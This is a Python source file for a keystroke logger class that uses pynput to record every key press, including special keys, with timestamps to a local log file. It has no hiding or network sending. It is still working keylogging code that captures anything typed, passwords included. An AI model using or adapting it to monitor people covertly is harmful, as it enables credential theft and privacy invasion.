import logging
import os
from pynput import keyboard

class KeystrokeLogger:
    def __init__(self, log_file='keystrokes.log'):
        """
        Initialize the keystroke logger.
        
        :param log_file: Path to the log file where keystrokes will be recorded
        """
        # Ensure logs directory exists
        os.makedirs('logs', exist_ok=True)
        
        # Configure logging
        self.log_file = os.path.join('logs', log_file)
        logging.basicConfig(
            filename=self.log_file, 
            level=logging.INFO, 
            format='%(asctime)s: %(message)s'
        )
        
        # Keyboard listener
        self.listener = None

    def on_press(self, key):
        """
        Callback method for key press events.
        
        :param key: The key that was pressed
        """
        try:
            # Try to log the character representation of the key
            char = key.char
            logging.info(f'Pressed: {char}')
        except AttributeError:
            # Handle special keys (like shift, ctrl, etc.)
            logging.info(f'Special key pressed: {key}')

    def start_logging(self):
        """
        Start the keystroke logging.
        
        :return: The listener object
        """
        # Create a listener that calls on_press for each key press
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        logging.info('Keystroke logging started')
        return self.listener

    def stop_logging(self):
        """
        Stop the keystroke logging.
        """
        if self.listener:
            self.listener.stop()
            logging.info('Keystroke logging stopped')